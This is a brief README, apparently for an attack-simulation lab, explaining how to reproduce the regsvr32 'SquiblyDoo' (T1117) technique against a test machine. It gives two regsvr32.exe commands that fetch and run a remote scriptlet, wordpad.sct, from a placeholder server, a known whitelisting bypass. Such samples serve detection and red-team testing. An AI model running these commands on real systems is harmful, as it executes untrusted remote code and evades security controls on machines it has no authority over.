# SquiblyDoo/T1117 Sample

On a machine with an HTTP Server, place the file "wordpad.sct" in the a served folder that can be accessed by the test/victim machine. If no HTTP Server is available you can use web_server.py from my repo (https://github.com/ColbyBurkett/Python-web-server). The serving folder is the same folder that web_server.py is running from.
**_Launch this from the victim machine:_**
```
regsvr32.exe /s /u /i:http://{serving IP:port}/wordpad.sct scrobj.dll
cmd.exe /c regsvr32.exe /s /u /i:http://{serving IP:port}/wordpad.sct scrobj.dll
```